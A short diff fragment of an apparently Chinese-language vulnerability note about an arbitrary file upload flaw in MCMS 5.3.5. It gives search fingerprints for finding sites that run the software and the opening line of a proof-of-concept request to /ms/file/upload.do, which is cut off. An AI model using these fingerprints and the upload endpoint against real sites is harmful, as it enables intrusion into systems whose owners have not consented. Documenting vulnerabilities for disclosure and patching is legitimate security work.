@@ -10,7 +10,7 @@ MCMS 5.3.5 存在允许在某些页面上传任意文件的漏洞。由于缺乏
 body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"
 ```
 
-## poc
+## POC
 
 ```yaml
 POST /ms/file/upload.do HTTP/1.1
